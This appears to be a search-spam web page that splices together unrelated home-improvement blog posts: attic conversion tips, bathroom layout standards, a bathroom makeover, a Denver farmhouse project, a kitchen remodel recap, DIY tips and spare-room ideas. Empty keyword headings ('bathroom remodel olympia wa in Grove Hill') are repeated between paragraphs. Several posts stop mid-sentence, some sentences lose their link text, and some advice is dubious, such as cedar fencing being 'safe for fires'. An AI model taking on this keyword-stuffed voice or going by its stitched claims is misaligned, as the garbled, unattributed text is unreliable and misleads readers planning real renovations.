after.</p>   <p><strong>6. Make sure your budget allows for contingencies-</strong> It&#x2019;s often less expensive to add those forgotten amenities when walls are opened up and exposed. It would be a shame if you decided you wanted to add a few more recessed cans or a larger window in front of the sink but it just wasn&#x2019;t in the budget. </p>   <p>Here are some great sources for gathering photos of what you like.

I grossly underestimated the total tile cost at the time. At $15/sf, it would have cost us more like $600 just for the flooring!

   <div>   <p>If you are planning to remodel an attic into living space, you probably know already that you are making a financially smart decision. When you refinish or remodel an attic, it may be the least expensive way to add living space to your home. Remodeling an attic, however, is often not an easy task. Attic spaces present unique remodeling concerns. These eight tips will help you plan for and overcome many of the challenges of remodeling an attic into living space.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>If you need the help of a professional, you can find someone in your area through . They have a form page where you can find someone near you. Not just in Dallas and the service is free.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>1. Plan carefully. Remember that the order in which inspections must be obtained will dictate your schedule. Think through every aspect of both the design and the project, consider possible challenges, and devise plans to overcome each challenge.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>2. Design the space for the type of room. The way you design and remodel the space will vary with the uses you plan for the finished room. For example, a bedroom may have different requirements than a playroom. It is also important to think ahead and consider other uses for the space in the future.</p>   <p>3. Plan access to the new room(s) carefully. Creating access to the new space is challenging in some homes. If you are trying to reduce costs for your project, you will want to find and construct the stairs in the best point of access and in a way that involves the least modification of the existing structure. You will also need to check local building codes with reference to exit points. Make sure you have plenty of access and room. If your air conditioning unit is in your attic, you might have to do some extra renovation. While you&#x2019;re looking at it, you should consider some .</p>   <p>4. Decide how you will work with the slope of the roof. This is an important aspect of planning, and it will affect your cost and the appearance and functionality of the new room. Do you want a pitched or a cathedral ceiling? How will you construct it? How will you install adequate insulation?</p>   <p>5. Design the room in a way that allows you to use the &#x201c;dead space&#x201d; near the lowest point of the pitch of the roof. Consider that these areas can be made into outstanding storage areas with a little advance planning.</p>   <p>6. Remember that ventilation and insulation are critical in an attic. Remember that heat rises. Attics can become very warm. You will need to plan for adequate ventilation and insulation to keep the room comfortable without drastically increasing your heating and cooling costs.</p>   <p>7. Plan for wiring and plumbing needs well in advance of beginning work. Electrical wiring and plumbing can present unique challenges in attics. You will need to ensure that the flooring does not rest on any wires. A bathroom will cost least if placed in close proximity to another existing supply and drain line.</p>   <p>8. Consider how and when you will get materials into the space. Consider carefully the size and weight of materials needed for your remodeling project. Plan for how and when you will get large items, like drywall or a toilet, up the stairs and into their permanent position. If you close in the stairs too soon, you could have a problem.</p>   <p><strong>In Conclusion:</strong></p>   <p>If you are planning to finish or remodel an attic into living space, careful planning and attention to the unique challenges presented by the space will be essential. You can expect to gain valuable living space as well as some increase in the value of your home. Always consult with someone who knows what they are doing. A home improvement professional can help.

   <div>   <ul>    <li>14 January, 2013</li>   </ul>   <p>During the housing gold rush, many homeowners viewed their houses as profit engines, not places to stay for the long haul.

   <div>   <p>Does it make a difference? Maybe it can.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>When you imagine your bathroom remodel and you think of all your options, often one tends to not put much thought into the type of material that goes onto the floor of your shower &#x2013; it&#x2019;s usually just tile or fibreglass right?</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>How about changing it up a little and considering a wood slat floor?

   <div>   <ul>    <li>July 25, 2012</li>   </ul>   <p>Bathroom layout planning is foremost in making this space a comfortable and convenient one. Just a few things need to be kept in mind while designing the bathroom layout. A bathroom comprises of two zones &#x2013; the dry zone and the wet zone. The dry zone houses the wash basin and the water closet and the wet zone comprises the shower area. The bathroom entrance should open into the dry zone with the wash basin in closest proximity. This is because the wash basin is the most used entity of the bathroom. This is followed by the water closet and the shower area.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>&#xa0; The bathroom entrance should not be less than 750 mm (2ft-6in) in width. You can opt for a hinged door or a sliding door depending on the availability of space in the bathroom. Space constrained bathrooms should use sliding doors. The wash basin should have at least 450 mm (1ft-6in) on each side so that it can be conveniently used. The same holds true for the water closet (W.C.). Leave at least 450 mm (1ft-6in) on both sides of the water closet. This space is utilized to provide the health faucet and the toilet paper holder. The shower area should not be less than 900 mm (3ft) wide. Usually, a drop of 1/2 inches is provided in the shower area. This is to keep off water from the dry zone. You can also segregate the shower area by providing a glass partition or shower curtains.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong><span><span>Related Articles</span></span></strong><span> &#xa0;<strong> &#xa0;&#xa0;</strong></span> &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0;&#xa0;&#xa0; &#xa0; &#xa0; &#xa0; &#xa0;&#xa0;&#xa0; &#xa0; &#xa0; &#xa0; </p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>A good bathroom also boasts of ample storage space. Utilize the space below the wash basin for this purpose. Cabinets can be provided here to house towels, toilet papers and other bath accessories. Mirror cabinets can be provided above the wash basin counter to store hygiene products. The walls can also be successfully used for storage. The walls enclosing the shower can house niches to keep shower accessories within easy reach.</p>   <h2>Bathroom Layout Plan</h2>   <p>The plan below shows the layout of a bathroom measuring 2700mm X 1800mm (9 ft X 6 ft). It illustrates the standards discussed above.</p>   <div>    <p>Bathroom Layout Plan</p>   </div>   <p>This image is representative of the bathroom layout plan shown above.</p>   <div>    <p>Bathroom</p>   </div>   <p>The plan below shows an alternate bathroom layout. The size of the bathroom remains the same; however the door location has been changed. This layout boasts of a larger wash basin counter. The entire wall behind the wash basin can be utilized for a mirror. This would make the bathroom appear larger than it actually is. Also, the entire space below the counter can be used for storage.</p>   <div>    <p>Bathroom Layout Plan</p>   </div>   <p>This image shows a wall-to-wall wash basin counter representative of the one in the plan above. The large mirror adds depth to the space and it can work wonders for a small bathroom. The large under-counter storage space is an added advantage.</p>   <div>    <p>Wall to wall wash basin counter</p>   </div>   <p>Though both the bathrooms layouts are convenient, the space is utilized better in the second plan. Thus, it is imperative to plan your bathroom layout to use the space sensibly.</p>   <div>    Tags: ,   </div>  </div>

   <div>   <p>We finally updated the enough so that I can show you some of it without bowing my head in shame.&#xa0; Yes, this is the same pink and acid green bathroom I had Sherry from design around.&#xa0; I wanted&#x2013;no, demanded&#x2013;happy pink and yellow.&#xa0; Then I painted the bathroom and realized I love many things, .&#xa0; Just in case you don&#x2019;t feel like link hopping, here is the before:</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>And here is the after:</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Since the pink and yellow didn&#x2019;t look how I imagined, I decided to make all the changes Sherry suggested, just using the look I plan to use throughout the house [re: masculine, rustic, dark, with a touch of die-hard Catholic grandma]. We are about 50% done. We still have to caulk everything, lay down baseboards, buy a special L-shaped curtain rod, a shower curtain, and cabinet knobs and pulls. (I have yet to find some I love, so I followed excellent suggestion and kept in place the originals until the right ones come along.)&#xa0; I was able to do everything for roughly $300.&#xa0; When you add in everything we have left to do, the total cost will be around $500.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The floor is Home Depot&#x2019;s peel and stick floor tiles in a faux wood parquet pattern. They are a perfect match to the oak floors in the hallway and tolerate a ridiculous amount of splashing from the boys nicely.&#xa0; I painted the vanity a dark brown using my favorite Ralph Lauren paint.&#xa0; I can&#x2019;t remember the color and the can doesn&#x2019;t have a label (?!) but I think it was Galvanized.&#xa0; I would know it if I saw the chip, so if anyone wants the color, let me know.&#xa0; The walls are Cameo Pink, also by Ralph Lauren.</p>   <p>The paint and flooring were the cheapest part of the makeover.&#xa0; The most expensive items are boring things, like frames.&#xa0; Ordinary, not at all special, frames!&#xa0; What a bother.&#xa0; I used these simple in wood to frame prints from the my mom bought The Mister and I <em>nine years ago</em> when she was at a conference in Spain.&#xa0; I didn&#x2019;t like them at the time, but didn&#x2019;t have the heart to get rid of them.&#xa0; Of course, now they work perfectly with everything and are proof that mothers always know best.</p>   <p>Part of the reason I couldn&#x2019;t part with them is because of the way the museum decided to print them.&#xa0; They are a very thin canvas on top of a stiff burlap.&#xa0; A little tag details the title and artist.</p>   <p>On the left is .</p>   <p>On the right is .&#xa0; Quick side story&#x2013;my mom had the &#x201c;de&#x201d; in her last name, too, which is typically what you would add as a young bride in the 60s to signify you now belong to your husband&#x2019;s family.&#xa0; Like, you know, chattel or a pair of pillows from Pottery Barn.&#xa0; When they arrived in the U.S., the first thing my mom did was drop the &#x201c;de&#x201d; because, her words, &#x201c;I am not a lamp.&#x201d;</p>   <p>My favorite print to date, by on etsy. I adore everything in his shop.

   <div>   <p>The Denver Farmhouse Project began in the winter of 2014, with an attempt at a garage remodel at our current property. We&#x2019;d lived in our current abode for 5 and a half years at that point, and in during that time we had completed several remodel projects on the 1921 brick bungalow in the Highlands neighborhood&#xa0;of Denver (roughly a mile and a half northwest of downtown.). The largest undertaking was finishing the basement, which included the sizable task of lowering the floor to provide more ceiling height. This resulted in the north wall of the house coming dangerously close to collapsing just days before they were scheduled to re-pour the new concrete floor, all due to a freak rainstorm of epic proportions and a misplaced downspout. But we survived and now call the lower level home to our master suite, laundry room, and an additional bedroom. Having the original windows re-built onsite and updated with additional installation and double paned glass was another big-ticket project, but the character it preserved was well worth the cost and plaster damaged caused in the re-installation. (Note to self: get this fixed before moving out&#x2026;) The project that made the most noticeable difference was our landscape overhaul and yard extension. Blessed with a corner lot, we leveled things out and extended the fenced area to create a side-yard complete with a fire pit, aspen grove, and garden area. We also swapped out the unsightly endless sea of red mulch on the breezeway in between the sidewalk and the street as well as in front of the house (a half-assed completed DIY job by the house&#x2019;s former owners) with beautiful, but thirsty grass. The complements we received from neighbors and passerbys made us realize just how much our house had previously been the eye sore on the block! A full paint job and first floor bathroom remodel rounded out the list of completed renovations.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0;<em>Our current home, a 1921, craftsman bungalow in&#xa0;the Highlands Neighborhood of Northwest Denver.</em></p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>The garage had been an annoyance since we&#x2019;d moved in. It was built up onto an elevated pad of concrete, so the short driveway leading into it was a sharp uphill turn that didn&#x2019;t leave you with enough pull-in space to actually fit 2 cars into what was otherwise a 2-car garage. And backing out of the garage&#x2026;let&#x2019;s just say that it took considerable practice as well as &#x201c;cahones&#x201d; to do a blind, incredibly tight, 90 degree turn in reverse (a former car of mine took the brunt of the beating, getting scraped up mightly in my first attempt at the feat.) Snowy or&#xa0;icy weather made shoveling imminent and traveling up and down the driveway&#xa0;treacherous, but it did serve as one hell of a skate ramp for the neighborhood kids. (Thankfully no one has smashed their face in and sued us for damages&#x2026;)</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Ok, so here was the remodel plan:</p>   <ul>    <li>Get rid of the unnecessary concrete retaining wall and lower the garage to street level</li>    <li>Straighten out the drive, so you could easily pull in and out of the garage onto the street, avoiding the alley all together</li>    <li>Make the overall size of the garage larger, so it could accommodate a woodshop for David&#x2019;s new found hobby of fine woodworking</li>    <li>Add a second floor or loft area to the garage to accommodate overflow storage, specifically Kim&#x2019;s horse tack and supplies, and/or make it all tricked out as a greenhouse or lounge space</li>   </ul>   <p>After several meetings with an architect and our trusted and amazing contractor George Harrison (my brother-in-law, David&#x2019;s brother who had already carefully restored our home to all of it&#x2019;s former glory over the years,) several things became painfully obvious:</p>   <ul>    <li>We&#x2019;d be fighting an uphill battle to get a second story onto the garage. The zoning board would automatically reject it, and an appeal could be lengthy and potentially futile. (Apparently Denver is convinced that by adding a second story onto your garage, you&#x2019;ll automatically be creating an additional living space or&#xa0;apartment, thus disrupting intended parking and overall traffic&#x2026;)</li>    <li>The desired size for the garage may or may not fall into the determined &#x201c;footprint&#x201d; of the original structure &#x2013; meaning that we might have to scale back the size of the new garage in order to meet zoning requirements, making an already tight space for parking 2 cars and large&#xa0;woodworking machinery even tighter</li>    <li>In order to reconfigure the driveway for easier pull in and pull out, a large tree would have to be taken down, and a telephone pole would have to be removed and relocated to some other seemingly non-existent space in the alley for an unspecified, but most likely incredibly expensive amount</li>    <li>The plumbing for our entire house may or may not be running directly thru that concrete retaining wall that our current garage sat on top of &#x2013; meaning that our plumbing would potentially have to be re-routed in order to accommodate the new garage. Sounds cheap, right?</li>   </ul>   <p>And even if we got everything we&#x2019;d wanted, we were still trying to &#x201c;fit a square peg into a round hole&#x201d; (so to speak) in regards to space and size with the new garage. Additionally, on top of still having little to no storage around the house, I had decided that we absolutely needed a third dog and had managed to convince David of the idea during this time. While we were loving the new addition to our family, things were getting a little cramped and the level of organized chaos seemed to be reaching somewhat of a breaking point.</p>   <p>Thus the question was raised: Would it be worth it to look at real estate in surrounding towns to see if we could find a new home with more property that would better suit&#xa0;our needs?</p>   <p>After carefully weighing whether I just liked looking at real estate, or whether I actually wanted to move, the answer was&#xa0;to at least take a look.</p>   <p>We&#x2019;ve loved our time in Denver, we really have. David and I met there, fell in love there, had our first house there, and went from one dog to three dogs there. But we&#x2019;d also watched the city grow exponentially in a short period of time, and found ourselves craving a bit more quiet and a bit more elbow room. I grew up on a small farm, so I&#x2019;ve never even remotely considered myself to be a &#x201c;city girl&#x201d; (although Denver has always felt like a big town full of little neighborhoods instead of a city,) and David had expressed interest in owning more land at some point in time, so why not do it now?</p>   <p>So like all good searches these days, we turned to the trusty Internet and began to explore surrounding towns like Wheat Ridge, Golden, Morrison, and Lakewood. Armed with our trusty real estate agent and friend Jess Kuhn of City Limits Property Management, we found some interesting options over the next few months, but&#xa0;never found&#xa0;one that checked off enough boxes. Too many homes in the area were enormous, 5-6 bedroom sprawling suburban compounds. Which fit the bill for the average suburban family with 3.5 children or more, but not for us. As a couple with three small dogs, there was simply no way we needed that much space. So when a 1.5 acre lot went on the market in western part of Arvada that came with the opportunity to build exactly what we wanted and needed, it seemed like it was too good to pass up.</p>   <p>A vacant, residential lot that close to downtown Denver was pretty much unheard of! And the price, while not a steal, was well worth it. We had kicked around the idea of how great it would be to find a lot of land and build from scratch, but hadn&#x2019;t come across anything and hadn&#x2019;t expected to. But low and behold here it was! We visited the property&#xa0;with Jess and had an offer submitted&#xa0;within a few hours. Better yet, it was accepted shortly thereafter. On October 1<sup>st</sup>, 2014, what would eventually become 14400 W. 52<sup>nd</sup> Ave. became ours. (In fitting fashion, Dave came to closing right from the woodshop, so he was covered in wood shavings. I came straight from the farm and still had my riding breeches and tall boots on &#x2014; weren&#x2019;t we quite the pair!)</p>   <p>Now if you would have told me that 16 months after closing, we still hadn&#x2019;t even broken ground on the new house, I&#x2019;m not sure if I would have committed to this whole undertaking. But I&#x2019;m still glad we did. Unfortunately, it&#x2019;s just taken that long to find a great architect, figure out a design, change it like 50 times, tweak it, tweak it, and tweak it some more and have David tell me that it&#x2019;s only a few weeks away from being finished every single week&#x2026; But apparently now we&#x2019;re actually getting close to being done with the design and can submit for building permits after that.</p>   <p>So now we can share the good stuff and the fun stuff with you all! I&#x2019;ll need some posts to get you all caught up to speed on things, but then we&#x2019;ll be full steam ahead on something that we hope will be pretty stellar. And in the end, we&#x2019;ll get to live there!</p>   <p>So lace up your work boots kids, it&#x2019;s&#xa0;going to be one hell of a ride!</p>   <p>&#xa0;</p>   <p>Thanks for reading along!</p>   <p>Love, Kim</p>   <div>    <h3><em>Related</em></h3>   </div>  </div>

The microwave drawer, having been installed in the island as well, frees up the counter space where the typical microwave lives and eliminates any spills of food or breakage of dinnerware due to its lower location and accessibility for the girls.

I rebuilt the leaky shower base and tiled it in a stone look then tiled the entire floor in a 2&#x2032; x 2&#x2032; honed sandstone.&#xa0; I also tiled the shower walls with a nice tile that had a cool border. I should have pictures in the renovations section shortly. The painted walls are a funky green that was chosen by the client.

   <div>   <p>In May we began a kitchen remodeling that was&#x2014;more or less&#x2014;finished in July.&#xa0; My original plan was to write a lessons-learned summary at the point where we were completely done.&#xa0; That&#x2019;s right, <em>done</em>&#x2013;every seam sanded, all nail holes patched, curtains hung.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>Kitchen Before (East)</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>   <p>That could be in 2015.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Having spent many years (ok, decades) as an IT professional, I should have known better.&#xa0; If you leave the documentation (or curtains) to the end, the work drags on like a northern winter.</p>   <p>But I was so anxious to call it done&#x2014;and it was so close&#x2014;that I couldn&#x2019;t help myself.&#xa0; Come to think of it that&#x2019;s the same rationale we used on projects.</p>   <p>So, in the interest of continuity, I have decided to do a post now.&#xa0; With the ceiling unpainted, a decorative alcove unfinished and the adjacent hallway untouched (hold it, that&#x2019;s a different room, right?), we are happily&#x2014;and much more attractively&#x2014;functional!</p>   <div>    <p>Kitchen After (Old Shades&#x2013;Sigh)</p>   </div>   <p><strong>&#xa0;</strong><strong>Summary</strong>:</p>   <p>We decided in April to remodel our 1939 kitchen.&#xa0; We used a designer from a local HOBO store for cabinetry design and spent about a month planning.&#xa0; I would act as general contractor and use various professionals and an accomplished amateur (my husband) as subcontractors</p>   <p>Included in the remodel were new cabinets, granite countertops, a tile backsplash and a 3/4&#x201d; oak floor.&#xa0; We needed to remove soffits and take out a small dividing wall that we thought (insert evil laugh here) had nothing inside of it.&#xa0; The sink and dishwasher stayed in the same spots, but the oven and refrigerator were relocated.</p>   <p>We hoped to do the project in six weeks from demolition to functionality.&#xa0; In reality it took eight due to the following issues:</p>   <p>Delay 1:&#xa0; Cabinets were ordered late because I gave them the wrong ceiling height which required design modifications.&#xa0; The previous owners had told us the ceiling was 9 ft and it was really 8&#x2019; 6&#x201d;.&#xa0; Lesson:&#xa0; Verify everything even if <em>no one</em> has 8&#x2019; 6&#x201d; ceilings (the measurements I actually <em>did</em> were fine).</p>   <p>Delay 2:&#xa0; We needed to remove a surprise asbestos covered heating duct and re-route the heat.&#xa0; Who would have thought that the simple little dividing wall on the side of the old pantry would contain that?&#xa0; &#xa0;Lesson:&#xa0; Stuff happens; that&#x2019;s what contingency planning is for.</p>   <p>All in all, I was happy with the timing.&#xa0; We&#x2019;ve had simpler, professionally run remodeling projects with worse delays (and poorer excuses).</p>   <p><strong>What was done right</strong></p>   <p>Here are some of the things we decided went well:</p>   <p>I planned a 20% contingency amount into the budget.&#xa0; At one point I thought this was high.&#xa0; Nuh-uh.&#xa0; When the asbestos made its appearance, we were fine; ditto when I <em>had to</em> have the more expensive backsplash.</p>   <p>I used contractors we had worked with successfully in the past and asked around extensively where I needed new ones.&#xa0; I queued up the contractors early and kept in touch regarding the schedule.</p>   <p>I made sure there were due dates in critical contracts and held our contractors accountable (nicely). &#xa0;If you had a general contractor, they would be pushing the subs on the schedule and quality control.&#xa0; If you are the general, this is your job.&#xa0; And in the end, the bothersome issue nagging at you may be a simple fix for them.</p>   <p>We set up to &#x201c;hunker down.&#x201d;&#xa0; Remodeling can be long and every convenience helps. Examples:</p>   <ul>    <li>We bought a nice outdoor grill complete with a side burner a couple years earlier in preparation for this project.</li>    <li>John ran a water line up the cold air return in the living room to our refrigerator stored there.&#xa0; Since there were a couple of days where we had no water at all on the first floor (even the bathroom), it was an amazing help.&#xa0; We had handy drinking water and the ability to brew coffee without taking a flight of stairs.</li>    <li>We maintained some indulgences&#x2014;like a &#x201c;coffee bar,&#x201d; that we set up in the living room (right by the relocated fridge with water).</li>   </ul>   <p>Next Post:&#xa0; &#x2026;</p>   <div>    <div>     <h3>Related Posts</h3>    </div>   </div>   <div>    <div>     <h3>Share...</h3>    </div>   </div>   <footer>    <p> Categories: | Tags: , , , , , | </p>   </footer>   </div>

   <div>   <p>Thanks to for tipping us off to a new use for old tires: recycled rubber sinks.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>RUBBiSH, a new building material created by Santa Monica, Calif.-based architectural firm Minarc, recently won an Architect Magazine R+D Award, which honors the best in progressive building.&#xa0; RUBBiSH is made from melted tires, which is cleaned and formed into a sheet.&#xa0; According to :</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <blockquote>    <p>&#x201c;This sheet is stretched over a base frame&#x2014;made of wood, metal, or any other material out of which bathroom furniture can be fashioned&#x2014;and anchored down by the drain collar. This creates a shallow-sloped surface for water to be siphoned away, but not a clunky profile; in fact, the material used is so minimal that, the manufacturer claims, the sinks use less than one pound of rubber. Two options are available, the most basic being the 1/8-inch-thick sheet of rubber adhered directly to the cabinet underneath. The other is a framed option, in which the sheet of rubber is sandwiched between two sheets of aluminum around the edges.&#x201d;</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </blockquote>   <p>For more sustainable home improvement ideas, read our guide on &#x201c;.&#x201d;</p>   <h6><span>Photo Courtesy Minarc</span></h6>  </div>  
   <div>      <p>Painting is a simple home improvement, while an addition is a big one. Use what you have read in this this article to make sure your project is successful.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>If your floor is squeaking, utilize construction adhesive to halt the squeaks. You may have to work your way into the basement or a crawlspace, but it is worth the effort. Take a caulking gun and put glue on both sides of each floor joist, making sure that the glue binds the subfloor planks with the joists.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>If you are looking for a cheap method when it comes to floor tiles, try using vinyl tiles rather than using stone or ceramic tiles. Many people choose vinyl because it is waterproof, durable and can often be installed in a single day. Although you can purchase this in sheet form, it is most commonly sold by the square foot in boxes.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Solar Panels</h2>   <p>Think about inserting solar panels on your home. This is a great investment, especially since you will have to pay more for electricity. Installing solar panels will lower your overall utility bills. This is a great and natural way to give your house the power it needs.</p>   <p>Before buying &#x201c;quality&#x201d; supplies, see to it that you shop around for the best deals possible. For example, quality home flooring can be expensive, but if you shop around, you should be able to find the flooring in your price range. You can enlist the help of bargain basements and discount supply houses.</p>   <p>Don&#x2019;t get rid of bathroom doors due to them being dirty. Instead, remove them from their frame and sand them down. Get some oil-based paint and apply with a roller. For a brand new feel, opt to change your doorknobs to a fancier design.</p>   <p>Two-liter bottles can be used as containers in your kitchen. They provide a see-through surface and can hold a myriad of dry goods ranging from sugar, flour or oatmeal. You can keep them in the freezer, on your shelf or in the refrigerator. When you require the contents, just remove its cap and pour.</p>   <p>Ask a reputable professional to help you inspect the condition of your existing floors before you decide to lay down all new hardwood. Frequently, you may have a wonderful floor right under the old flooring in your home. You can wind up with nice, high-quality flooring for far less money than purchasing new hardwood.</p>   <p>Another way to make your home safe is to pad the corners of furniture if it is sharp. You can find cheap corner protectors in any store, or apply foam tape yourself on sharp edges. Another way to prevent your child from getting hurt is to use tape on any loose wiring.</p>   <h2>Wood Cabinets</h2>   <p>Rather than going with a cheap composite material, choose real for your home. Wood is one of the most durable materials out there and can resist warping, staining and scratching. Some of the more common choices for wood cabinets are maple, cherry and oak. Although wood can be stripped and stained different colors, it&#x2019;s best to choose a stain color you like because stripping and re-staining wood cabinets can be an expensive and time-consuming task.</p>   <p>If your home is in a dry area that is prone to fires, you should consider buying white or red cedar fences. Cedar wood is good for its smell and since it is strong, it also is safe for fires.</p>      <p>When you remodel a bathroom, be sure to have enough light. When it comes to bathroom remodeling projects, people tend to overlook the importance of lighting. Lights are important to incorporate near a medicine cabinet or on the ceiling.</p>   <p>Consider creating a new look by building the bed of your dreams. It is tough, but with effort and hard work, you can build something that is unique, customized just for you, and truly gorgeous.</p>   <p>Planning is the most important step in any home-improvement endeavor. The decisions about your budget, timing and the exact projects you want to do much be included in your plan to avoid going over budget and taking too much time on the projects.</p>   <h2>Proper Safety</h2>   <p>Alway employ proper safety precautions. It might seem funny to wear a construction hat, but it&#x2019;s important for your health and safety. If you have proper safety equipment, like dust masks, goggles, hardhats, etc., you can maintain your home and your health at the same time.</p>   <p>Make sure those cabinets are securely screwed to stud in the wall. Mark and locate any wall stud prior to installing these so you can figure out where screws can go. Stud finders can be purchased for a low price from any hardware store.</p>   <p>Before you try to remove your popcorn ceiling, have it tested to make sure there is not asbestos in it. Asbestos is a dangerous building material that was used in the past and requires removal by only licensed contractors. If there is asbestos in your ceiling, a specially trained crew will need to be hired.</p>   <p>There is no need for improving one&#x2019;s home to be hard. Good information will guide you in the right direction. Some effort can take you far when it comes to home improvement, whether you or someone else is making the repairs.</p>   <p>PS: Want to Learn How To Make More Money?</p>  </div>  
   <div>   <p>It was their first plumbing project. &#x201c;It was just a small crack in a pipe,&#x201d; says Karah Bunde. She and her husband, Joel, had just purchased a fixer-upper they planned to renovate and rent.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>They bought a new piece of PVC pipe to replace the cracked one. &#x201c;We installed it, glued it, gave it 24 hours to cure. The next day we turned on the water and it busted at the seams. We had extra pipe and did it again, this time allowing it to cure for two days. Same story,&#x201d; says Bunde, an avid DIYer who writes &#x201c;The Space Between&#x201d; blog.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The couple returned to the store and started asking questions.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Turns out they had made one of the most common DIY mistakes: choosing the wrong material for the job. &#x201c;Our downfall was not doing enough research. Turns out we picked PVC pipe for drains and not one that would hold the pressure of water lines,&#x201d; Bunde says.</p>   <p>Whether you&#x2019;re choosing tile, flooring, lighting, or cabinets, making the right choice can make or break your success.

Otherwise, you may blow it all on a sexy plumbing fixture, but then choose the wrong flooring, for instance, just because it&#x2019;s cheap and you want to keep on track.</p>   <p>&#x201c;There are always tradeoffs, but having a budget will help you manage the choices,&#x201d; Miller says.</p>   <p><strong>2.&#xa0; Shop Where the Pros Shop</strong></p>   <p>Not to dis big-box stores; they&#x2019;re great for many things.

   <div>   <h4>About Rachel Rowell</h4> Rachel is a writer, musician, wife and mom. She travels, writes and road-schools her children full-time with her family of four in their 300 sq. foot camper. When she was a girl she dreamed of normal life with the big house and white picket fence like every other American girl. Then she grew up and realized it was okay to be different than everyone else. Now she and her family have ditched the American dream to live one of their very own.   </div>  
   <div>   <p>We all have that room in our homes that we try to hide. The one that only serves as a guest room a few times a year and then collects boxes and dust the rest of the time. It&#x2019;s time to get smart about the space in your home and make them functional for your daily life! Here are a few ideas to spruce up the spare room in your home.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong><strong>&#xa0;</strong></strong><b>Craft Room</b></p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Whether you are a seasoned crafter or your kids love to get creative, this is the space for you. Organize your spare room in a way that you are able to fit a larger craft table with options for storage. Consider talking to your contractor to install built-ins along the walls to decoratively organize your supplies. Your guests will talk about what a great room it is and you will be able to use it on a daily basis while keeping the rest of the house crayon and glitter free.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong><strong>&#xa0;</strong></strong><b>Home Office/Guest Bedroom</b></p>   <p>This is probably the easiest and most functional use of the spare room. Decide on a clean design with a desk and office storage that will suit your needs best. Then look into a bed that can also serve as a sitting area, preferably a daybed. This will allow a comfortable space for overnight guests and give you a quiet area to retreat to when working from home.</p>   <p><strong><strong>&#xa0;</strong></strong><b>Entertainment Room</b></p>   <p>Looking for a man cave? Do you need a place where the kids can play and watch their favorite movies? Make that spare room into an entertainment retreat. This space may be smaller than the standard entertainment room so here are a few space saving tips. Mount a flat screen television on the wall to eliminate the need for a large piece of furniture. Make sure to consider a couch that isn&#x2019;t so large that it will make the space feel tiny. Consider a smaller sectional that also has a sleeper option for guests, making this room multipurpose. When including storage, try to choose pieces that function as more than just storage. An ottoman or coffee table with a storage option is a great space saver.</p>   <p><strong> <span>Talk to your contractor and interior designer to get more in-depth options for your space. They will be able to take a look at that spare room and turn it into the year round, multi-purpose space of your dreams. Alan, at Arlington Custom Builders, works with you to make your vision become a reality! </span></strong></p>  </div>  
